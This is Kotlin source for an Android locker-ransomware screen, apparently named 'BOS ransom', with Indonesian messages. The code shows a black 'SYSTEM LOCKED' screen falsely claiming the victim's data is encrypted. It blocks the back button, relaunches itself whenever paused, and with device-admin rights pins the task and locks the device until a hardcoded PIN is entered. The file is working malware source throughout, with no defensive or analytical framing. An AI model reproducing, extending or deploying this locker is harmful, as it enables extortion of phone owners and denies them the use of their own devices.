package com.bos.ransom

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.graphics.Color
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast

class LockActivity : Activity() {

    private val PIN = "12345" // PIN rahasia BOS
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        window.addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD)
        window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED)
        
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.BLACK)
            setPadding(48, 48, 48, 48)
            gravity = Gravity.CENTER
        }

        val tv = TextView(this).apply {
            text = "SYSTEM LOCKED\n\nData lo udah dienkripsi.\nMasukin PIN buat buka."
            setTextColor(Color.RED)
            textSize = 20f
            gravity = Gravity.CENTER
        }

        val input = EditText(this).apply {
            hint = "PIN"
            setTextColor(Color.WHITE)
            inputType = android.text.InputType.TYPE_CLASS_NUMBER or
                        android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD
            gravity = Gravity.CENTER
        }

        val btn = Button(this).apply {
            text = "BUKA"
            setOnClickListener {
                if (input.text.toString() == PIN) {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val admin = ComponentName(this@LockActivity, AdminReceiver::class.java)
                    finishAffinity()
                    Toast.makeText(this@LockActivity, "Unlocked. Jangan ulangi.", Toast.LENGTH_LONG).show()
                } else {
                    Toast.makeText(this@LockActivity, "PIN SALAH!", Toast.LENGTH_SHORT).show()
                }
            }
        }

        layout.addView(tv)
        layout.addView(input)
        layout.addView(btn)
        setContentView(layout)

        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(this, AdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                startLockTask()
                dpm.lockNow()
            }
        } catch (_: Exception) {}
    }

    override fun onBackPressed() {
        // kosongin biar gak bisa back
    }

    override fun onPause() {
        super.onPause()
        handler.postDelayed({
            val i = intent
            i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
                       android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
            startActivity(i)
        }, 300)
    }
}
